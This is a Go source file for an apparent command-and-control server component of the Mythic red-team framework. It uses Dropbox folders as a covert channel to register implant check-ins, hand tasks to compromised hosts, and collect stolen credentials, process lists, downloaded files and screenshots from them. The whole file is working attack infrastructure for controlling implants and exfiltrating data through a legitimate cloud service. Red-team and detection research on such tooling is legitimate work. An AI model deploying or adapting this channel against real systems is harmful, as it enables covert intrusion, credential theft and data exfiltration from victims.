package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math"
	"net/http"
	"os"
	"os/signal"
	"path"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/MythicMeta/MythicContainer/mythicrpc"
	"github.com/MythicMeta/MythicContainer/rabbitmq"
)

const (
	configPath     = "./dropbox_server_config.json"
	dropboxAPI     = "https://api.dropboxapi.com/2"
	dropboxContent = "https://content.dropboxapi.com/2"
	idleRetryDelay = 15 * time.Second
)

type serverConfig struct {
	Token         string `json:"token"`
	TaskFolder    string `json:"task_folder"`
	ResultFolder  string `json:"result_folder"`
	ArchiveFolder string `json:"archive_folder"`
	PollInterval  int    `json:"poll_interval"`
}

type serverState struct {
	mu          sync.Mutex
	delivered   map[string]map[string]struct{}
	uploadCache map[string][]byte
	processed   map[string]struct{}
}

type listFolderResp struct {
	Entries []dropboxEntry `json:"entries"`
}

type dropboxEntry struct {
	Name string `json:"name"`
	Path string `json:"path_lower"`
}

type envelope struct {
	UUID string
	Body []byte
}

type checkinMessage struct {
	Action       string   `json:"action"`
	PayloadUUID  string   `json:"uuid"`
	User         string   `json:"user"`
	Host         string   `json:"host"`
	PID          int      `json:"pid"`
	OS           string   `json:"os"`
	Architecture string   `json:"architecture"`
	Domain       string   `json:"domain"`
	IPs          []string `json:"ips"`
	ExternalIP   string   `json:"external_ip"`
	ProcessName  string   `json:"process_name"`
	Integrity    int      `json:"integrity_level"`
}

type taskingMessage struct {
	Action      string `json:"action"`
	PayloadUUID string `json:"uuid"`
}

type processEntry struct {
	ProcessID       int    `json:"process_id"`
	ParentProcessID int    `json:"parent_process_id"`
	Architecture    string `json:"architecture"`
	Name            string `json:"name"`
	User            string `json:"user"`
	BinPath         string `json:"bin_path"`
	CommandLine     string `json:"command_line,omitempty"`
}

type credentialEntry struct {
	CredentialType string `json:"credential_type"`
	Realm          string `json:"realm"`
	Account        string `json:"account"`
	Credential     string `json:"credential"`
	Comment        string `json:"comment"`
}

type fileUploadMessage struct {
	ChunkSize int    `json:"chunk_size"`
	FileID    string `json:"file_id"`
	ChunkNum  int    `json:"chunk_num"`
	FullPath  string `json:"full_path"`
}

type fileDownloadMessage struct {
	TotalChunks  int    `json:"total_chunks,omitempty"`
	ChunkNum     int    `json:"chunk_num,omitempty"`
	ChunkData    string `json:"chunk_data,omitempty"`
	FullPath     string `json:"full_path,omitempty"`
	FileID       string `json:"file_id,omitempty"`
	IsScreenshot bool   `json:"is_screenshot,omitempty"`
}

type responseMessage struct {
	TaskID      string               `json:"task_id"`
	UserOutput  string               `json:"user_output"`
	Status      string               `json:"status"`
	Completed   bool                 `json:"completed"`
	Processes   *[]processEntry      `json:"processes,omitempty"`
	Credentials *[]credentialEntry   `json:"credentials,omitempty"`
	Upload      *fileUploadMessage   `json:"upload,omitempty"`
	Download    *fileDownloadMessage `json:"download,omitempty"`
}

type postResponseMessage struct {
	Action    string            `json:"action"`
	Responses []responseMessage `json:"responses"`
}

type dropboxService struct {
	client *http.Client
	cfg    serverConfig
	state  *serverState
}

func main() {
	log.SetFlags(log.LstdFlags | log.LUTC)
	log.Println("dropbox internal server starting")

	rabbitmq.Initialize()

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	state := &serverState{
		delivered:   make(map[string]map[string]struct{}),
		uploadCache: make(map[string][]byte),
		processed:   make(map[string]struct{}),
	}

	for {
		if ctx.Err() != nil {
			return
		}

		cfg, err := loadConfig()
		if err != nil {
			log.Printf("waiting for dropbox config: %v", err)
			select {
			case <-ctx.Done():
				return
			case <-time.After(idleRetryDelay):
			}
			continue
		}

		service := newDropboxService(cfg, state)
		if err := service.bootstrap(); err != nil {
			log.Printf("dropbox bootstrap failed: %v", err)
			select {
			case <-ctx.Done():
				return
			case <-time.After(idleRetryDelay):
			}
			continue
		}

		log.Printf("dropbox internal server ready with task folder %s", cfg.TaskFolder)
		if err := service.run(ctx); err != nil && !errors.Is(err, context.Canceled) {
			log.Printf("dropbox internal server loop error: %v", err)
			select {
			case <-ctx.Done():
				return
			case <-time.After(idleRetryDelay):
			}
		}
	}
}

func loadConfig() (serverConfig, error) {
	cfg := serverConfig{}
	data, err := os.ReadFile(configPath)
	if err != nil {
		return cfg, err
	}
	if err := json.Unmarshal(data, &cfg); err != nil {
		return cfg, err
	}
	if cfg.Token == "" {
		return cfg, fmt.Errorf("dropbox config is missing token")
	}
	if cfg.TaskFolder == "" {
		cfg.TaskFolder = "/killa/tasks"
	}
	if cfg.ResultFolder == "" {
		cfg.ResultFolder = "/killa/results"
	}
	if cfg.PollInterval <= 0 {
		cfg.PollInterval = 5
	}
	return cfg, nil
}

func newDropboxService(cfg serverConfig, state *serverState) *dropboxService {
	return &dropboxService{
		client: &http.Client{Timeout: 30 * time.Second},
		cfg:    cfg,
		state:  state,
	}
}

func (s *dropboxService) bootstrap() error {
	if _, err := s.listFolder(s.cfg.TaskFolder); err != nil {
		return err
	}
	if _, err := s.listFolder(s.cfg.ResultFolder); err != nil {
		return err
	}
	return nil
}

func (s *dropboxService) run(ctx context.Context) error {
	ticker := time.NewTicker(time.Duration(s.cfg.PollInterval) * time.Second)
	defer ticker.Stop()

	for {
		if err := s.pollOnce(); err != nil {
			log.Printf("dropbox poll error: %v", err)
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-ticker.C:
		}
	}
}

func (s *dropboxService) pollOnce() error {
	entries, err := s.listFolder(s.cfg.ResultFolder)
	if err != nil {
		return err
	}
	sort.Slice(entries, func(i, j int) bool {
		return entries[i].Name < entries[j].Name
	})

	for _, entry := range entries {
		if s.state.wasProcessed(entry.Path) {
			continue
		}
		content, err := s.downloadText(entry.Path)
		if err != nil {
			log.Printf("dropbox download failed for %s: %v", entry.Path, err)
			continue
		}

		s.state.markProcessed(entry.Path)
		if s.cfg.ArchiveFolder != "" {
			if err := s.movePath(entry.Path, path.Join(s.cfg.ArchiveFolder, entry.Name)); err != nil {
				log.Printf("dropbox archive failed for %s: %v", entry.Path, err)
			}
		} else if err := s.deletePath(entry.Path); err != nil {
			log.Printf("dropbox delete failed for %s: %v", entry.Path, err)
		}

		reply, err := s.handleEnvelope(strings.TrimSpace(content))
		if err != nil {
			log.Printf("dropbox message processing error: %v", err)
			continue
		}
		if reply == "" {
			continue
		}

		replyName := fmt.Sprintf("%d-response.txt", time.Now().UnixNano())
		if err := s.uploadText(path.Join(s.cfg.TaskFolder, replyName), reply); err != nil {
			log.Printf("failed to upload dropbox response: %v", err)
		}
	}
	return nil
}

func (s *dropboxService) handleEnvelope(encoded string) (string, error) {
	env, decoded, err := decryptEnvelope("dropbox", encoded)
	if err != nil {
		return "", err
	}

	var header struct {
		Action string `json:"action"`
	}
	if err := json.Unmarshal(decoded, &header); err != nil {
		return "", err
	}

	var responseBody []byte
	switch header.Action {
	case "checkin":
		responseBody, err = s.handleCheckin(decoded)
	case "get_tasking":
		responseBody, err = s.handleGetTasking(env.UUID, decoded)
	case "post_response":
		responseBody, err = s.handlePostResponse(env.UUID, decoded)
	default:
		return "", fmt.Errorf("unsupported dropbox action %q", header.Action)
	}
	if err != nil {
		return "", err
	}
	return encryptEnvelope(env.UUID, "dropbox", responseBody)
}

func (s *dropboxService) handleCheckin(raw []byte) ([]byte, error) {
	req := checkinMessage{}
	if err := json.Unmarshal(raw, &req); err != nil {
		return nil, err
	}

	resp, err := mythicrpc.SendMythicRPCCallbackCreate(mythicrpc.MythicRPCCallbackCreateMessage{
		PayloadUUID:    req.PayloadUUID,
		C2ProfileName:  "dropbox",
		User:           req.User,
		Host:           req.Host,
		PID:            req.PID,
		IPs:            req.IPs,
		ExternalIP:     req.ExternalIP,
		IntegrityLevel: req.Integrity,
		Os:             req.OS,
		Domain:         req.Domain,
		Architecture:   req.Architecture,
		ProcessName:    req.ProcessName,
	})
	if err != nil {
		return nil, err
	}
	if !resp.Success {
		return nil, fmt.Errorf("callback create failed: %s", resp.Error)
	}

	body := map[string]string{
		"id":   resp.CallbackUUID,
		"uuid": resp.CallbackUUID,
	}
	return json.Marshal(body)
}

func (s *dropboxService) handleGetTasking(callbackUUID string, raw []byte) ([]byte, error) {
	req := taskingMessage{}
	if err := json.Unmarshal(raw, &req); err != nil {
		return nil, err
	}

	callback, err := lookupCallback(callbackUUID)
	if err != nil {
		empty := map[string]any{"tasks": []map[string]any{}}
		return json.Marshal(empty)
	}
	_ = touchCallback(callbackUUID)

	searchCompleted := false
	searchResp, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
		SearchCallbackID: &callback.ID,
		SearchCompleted:  &searchCompleted,
	})
	if err != nil {
		return nil, err
	}
	if !searchResp.Success {
		return nil, fmt.Errorf("task search failed: %s", searchResp.Error)
	}

	tasks := make([]map[string]any, 0, len(searchResp.Tasks))
	for _, task := range searchResp.Tasks {
		if s.state.wasDelivered(callbackUUID, task.AgentTaskID) {
			continue
		}
		s.state.markDelivered(callbackUUID, task.AgentTaskID)
		tasks = append(tasks, map[string]any{
			"id":         task.AgentTaskID,
			"command":    task.CommandName,
			"parameters": task.Params,
		})
	}

	return json.Marshal(map[string]any{"tasks": tasks})
}

func (s *dropboxService) handlePostResponse(callbackUUID string, raw []byte) ([]byte, error) {
	req := postResponseMessage{}
	if err := json.Unmarshal(raw, &req); err != nil {
		return nil, err
	}

	callback, err := lookupCallback(callbackUUID)
	if err != nil {
		return nil, err
	}
	_ = touchCallback(callbackUUID)

	acks := make([]map[string]any, 0)
	for _, resp := range req.Responses {
		task, err := lookupTask(callback.ID, resp.TaskID)
		if err != nil {
			log.Printf("failed to resolve task %q for callback %s: %v", resp.TaskID, callbackUUID, err)
			continue
		}

		isFileTransfer := resp.Upload != nil || resp.Download != nil
		if resp.UserOutput != "" {
			_, err = mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
				TaskID:   task.ID,
				Response: []byte(resp.UserOutput),
			})
			if err != nil {
				log.Printf("response create failed for task %d: %v", task.ID, err)
			}
		}
		if resp.Processes != nil && len(*resp.Processes) > 0 {
			processes := make([]mythicrpc.MythicRPCProcessCreateProcessData, 0, len(*resp.Processes))
			for _, proc := range *resp.Processes {
				processes = append(processes, mythicrpc.MythicRPCProcessCreateProcessData{
					ProcessID:       proc.ProcessID,
					ParentProcessID: proc.ParentProcessID,
					Architecture:    proc.Architecture,
					BinPath:         proc.BinPath,
					Name:            proc.Name,
					User:            proc.User,
					CommandLine:     proc.CommandLine,
				})
			}
			if _, err := mythicrpc.SendMythicRPCProcessCreate(mythicrpc.MythicRPCProcessCreateMessage{
				TaskID:    task.ID,
				Processes: processes,
			}); err != nil {
				log.Printf("process create failed for task %d: %v", task.ID, err)
			}
		}
		if resp.Credentials != nil && len(*resp.Credentials) > 0 {
			creds := make([]mythicrpc.MythicRPCCredentialCreateCredentialData, 0, len(*resp.Credentials))
			for _, cred := range *resp.Credentials {
				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
					CredentialType: cred.CredentialType,
					Realm:          cred.Realm,
					Account:        cred.Account,
					Credential:     cred.Credential,
					Comment:        cred.Comment,
				})
			}
			if _, err := mythicrpc.SendMythicRPCCredentialCreate(mythicrpc.MythicRPCCredentialCreateMessage{
				TaskID:      task.ID,
				Credentials: creds,
			}); err != nil {
				log.Printf("credential create failed for task %d: %v", task.ID, err)
			}
		}
		if resp.Download != nil {
			ack, err := s.handleDownload(*task, callback, *resp.Download)
			if err != nil {
				return nil, err
			}
			acks = append(acks, ack)
		}
		if resp.Upload != nil {
			ack, err := s.handleUpload(*resp.Upload)
			if err != nil {
				return nil, err
			}
			acks = append(acks, ack)
		}

		if !isFileTransfer || resp.Completed || resp.Status != "" {
			update := mythicrpc.MythicRPCTaskUpdateMessage{TaskID: task.ID}
			shouldUpdate := false
			if resp.Status != "" {
				status := resp.Status
				update.UpdateStatus = &status
				shouldUpdate = true
			}
			if resp.Completed {
				completed := true
				update.UpdateCompleted = &completed
				shouldUpdate = true
				s.state.clearDelivered(callbackUUID, resp.TaskID)
			}
			if shouldUpdate {
				if _, err := mythicrpc.SendMythicRPCTaskUpdate(update); err != nil {
					log.Printf("task update failed for task %d: %v", task.ID, err)
				}
			}
		}
	}

	return json.Marshal(map[string]any{
		"action":    "post_response",
		"responses": acks,
	})
}

func (s *dropboxService) handleDownload(task mythicrpc.PTTaskMessageTaskData, callback *mythicrpc.MythicRPCCallbackSearchMessageResult, msg fileDownloadMessage) (map[string]any, error) {
	if msg.FileID == "" {
		filename := filepath.Base(msg.FullPath)
		if filename == "." || filename == string(filepath.Separator) || filename == "" {
			filename = "download.bin"
		}
		resp, err := mythicrpc.SendMythicRPCFileCreate(mythicrpc.MythicRPCFileCreateMessage{
			TaskID:              task.ID,
			FileContents:        []byte{},
			DeleteAfterFetch:    false,
			Filename:            filename,
			IsScreenshot:        msg.IsScreenshot,
			IsDownloadFromAgent: true,
			RemotePathOnTarget:  msg.FullPath,
			TargetHostName:      callback.Host,
		})
		if err != nil {
			return nil, err
		}
		if !resp.Success {
			return nil, fmt.Errorf("file create failed: %s", resp.Error)
		}
		return map[string]any{"file_id": resp.AgentFileId}, nil
	}

	chunk, err := base64.StdEncoding.DecodeString(msg.ChunkData)
	if err != nil {
		return nil, err
	}
	resp, err := mythicrpc.SendMythicRPCFileUpdate(mythicrpc.MythicRPCFileUpdateMessage{
		AgentFileID:    msg.FileID,
		AppendContents: &chunk,
	})
	if err != nil {
		return nil, err
	}
	if !resp.Success {
		return nil, fmt.Errorf("file update failed: %s", resp.Error)
	}
	return map[string]any{"status": "success"}, nil
}

func (s *dropboxService) handleUpload(msg fileUploadMessage) (map[string]any, error) {
	content, err := s.state.getUploadContent(msg.FileID)
	if err != nil {
		resp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
			AgentFileID: msg.FileID,
		})
		if err != nil {
			return nil, err
		}
		if !resp.Success {
			return nil, fmt.Errorf("file get content failed: %s", resp.Error)
		}
		content = resp.Content
		s.state.setUploadContent(msg.FileID, content)
	}

	chunkSize := msg.ChunkSize
	if chunkSize <= 0 {
		chunkSize = 512000
	}
	totalChunks := int(math.Ceil(float64(len(content)) / float64(chunkSize)))
	if totalChunks == 0 {
		totalChunks = 1
	}
	chunkNum := msg.ChunkNum
	if chunkNum <= 0 {
		chunkNum = 1
	}
	start := (chunkNum - 1) * chunkSize
	if start > len(content) {
		start = len(content)
	}
	end := start + chunkSize
	if end > len(content) {
		end = len(content)
	}

	return map[string]any{
		"chunk_num":    chunkNum,
		"chunk_data":   base64.StdEncoding.EncodeToString(content[start:end]),
		"total_chunks": totalChunks,
	}, nil
}

func (s *dropboxService) uploadText(remotePath, content string) error {
	req, err := http.NewRequest("POST", dropboxContent+"/files/upload", strings.NewReader(content))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+s.cfg.Token)
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Dropbox-API-Arg", fmt.Sprintf(`{"path":"%s","mode":"overwrite","autorename":false,"mute":true}`, remotePath))
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("dropbox upload failed: %s", string(body))
	}
	return nil
}

func (s *dropboxService) listFolder(folder string) ([]dropboxEntry, error) {
	payload := fmt.Sprintf(`{"path":"%s"}`, folder)
	req, err := http.NewRequest("POST", dropboxAPI+"/files/list_folder", strings.NewReader(payload))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+s.cfg.Token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := s.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("dropbox list_folder failed: %s", string(body))
	}
	out := listFolderResp{}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return nil, err
	}
	return out.Entries, nil
}

func (s *dropboxService) downloadText(remotePath string) (string, error) {
	req, err := http.NewRequest("POST", dropboxContent+"/files/download", nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Authorization", "Bearer "+s.cfg.Token)
	req.Header.Set("Dropbox-API-Arg", fmt.Sprintf(`{"path":"%s"}`, remotePath))
	resp, err := s.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("dropbox download failed: %s", string(body))
	}
	content, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(content), nil
}

func (s *dropboxService) deletePath(remotePath string) error {
	payload := fmt.Sprintf(`{"path":"%s"}`, remotePath)
	req, err := http.NewRequest("POST", dropboxAPI+"/files/delete_v2", strings.NewReader(payload))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+s.cfg.Token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("dropbox delete failed: %s", string(body))
	}
	return nil
}

func (s *dropboxService) movePath(from, to string) error {
	payload := fmt.Sprintf(`{"from_path":"%s","to_path":"%s","autorename":true,"allow_ownership_transfer":false}`, from, to)
	req, err := http.NewRequest("POST", dropboxAPI+"/files/move_v2", strings.NewReader(payload))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+s.cfg.Token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("dropbox move failed: %s", string(body))
	}
	return nil
}

func decryptEnvelope(c2Profile, encoded string) (*envelope, []byte, error) {
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, nil, err
	}
	if len(raw) < 36 {
		return nil, nil, fmt.Errorf("encoded envelope too short")
	}
	uuid := string(raw[:36])
	resp, err := mythicrpc.SendMythicRPCCallbackDecryptBytes(mythicrpc.MythicRPCCallbackDecryptBytesMessage{
		AgentCallbackUUID: uuid,
		Message:           []byte(encoded),
		IncludesUUID:      true,
		IsBase64Encoded:   true,
		C2Profile:         c2Profile,
	})
	if err != nil {
		return nil, nil, err
	}
	if !resp.Success {
		return nil, nil, fmt.Errorf("decrypt failed: %s", resp.Error)
	}
	return &envelope{UUID: uuid, Body: resp.Message}, resp.Message, nil
}

func encryptEnvelope(uuid, c2Profile string, message []byte) (string, error) {
	resp, err := mythicrpc.SendMythicRPCCallbackEncryptBytes(mythicrpc.MythicRPCCallbackEncryptBytesMessage{
		AgentCallbackUUID:   uuid,
		Message:             message,
		IncludeUUID:         true,
		Base64ReturnMessage: true,
		C2Profile:           c2Profile,
	})
	if err != nil {
		return "", err
	}
	if !resp.Success {
		return "", fmt.Errorf("encrypt failed: %s", resp.Error)
	}
	return string(resp.Message), nil
}

func lookupCallback(callbackUUID string) (*mythicrpc.MythicRPCCallbackSearchMessageResult, error) {
	searchUUID := callbackUUID
	resp, err := mythicrpc.SendMythicRPCCallbackSearch(mythicrpc.MythicRPCCallbackSearchMessage{
		AgentCallbackUUID:  callbackUUID,
		SearchCallbackUUID: &searchUUID,
	})
	if err != nil {
		return nil, err
	}
	if !resp.Success {
		return nil, fmt.Errorf("callback search failed: %s", resp.Error)
	}
	if len(resp.Results) == 0 {
		return nil, fmt.Errorf("callback %s not found", callbackUUID)
	}
	return &resp.Results[0], nil
}

func lookupTask(callbackID int, agentTaskID string) (*mythicrpc.PTTaskMessageTaskData, error) {
	searchAgentTaskID := agentTaskID
	resp, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
		SearchCallbackID:  &callbackID,
		SearchAgentTaskID: &searchAgentTaskID,
	})
	if err != nil {
		return nil, err
	}
	if !resp.Success {
		return nil, fmt.Errorf("task search failed: %s", resp.Error)
	}
	if len(resp.Tasks) == 0 {
		return nil, fmt.Errorf("task %s not found", agentTaskID)
	}
	return &resp.Tasks[0], nil
}

func touchCallback(callbackUUID string) error {
	resp, err := mythicrpc.SendMythicRPCCallbackUpdate(mythicrpc.MythicRPCCallbackUpdateMessage{
		AgentCallbackUUID: &callbackUUID,
	})
	if err != nil {
		return err
	}
	if !resp.Success {
		return fmt.Errorf("callback update failed: %s", resp.Error)
	}
	return nil
}

func (s *serverState) wasDelivered(callbackUUID, agentTaskID string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if tasks, ok := s.delivered[callbackUUID]; ok {
		_, exists := tasks[agentTaskID]
		return exists
	}
	return false
}

func (s *serverState) markDelivered(callbackUUID, agentTaskID string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if _, ok := s.delivered[callbackUUID]; !ok {
		s.delivered[callbackUUID] = make(map[string]struct{})
	}
	s.delivered[callbackUUID][agentTaskID] = struct{}{}
}

func (s *serverState) clearDelivered(callbackUUID, agentTaskID string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if tasks, ok := s.delivered[callbackUUID]; ok {
		delete(tasks, agentTaskID)
		if len(tasks) == 0 {
			delete(s.delivered, callbackUUID)
		}
	}
}

func (s *serverState) getUploadContent(fileID string) ([]byte, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	content, ok := s.uploadCache[fileID]
	if !ok {
		return nil, fmt.Errorf("upload cache miss")
	}
	return content, nil
}

func (s *serverState) setUploadContent(fileID string, content []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.uploadCache[fileID] = content
}

func (s *serverState) wasProcessed(remotePath string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	_, ok := s.processed[remotePath]
	return ok
}

func (s *serverState) markProcessed(remotePath string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.processed[remotePath] = struct{}{}
}
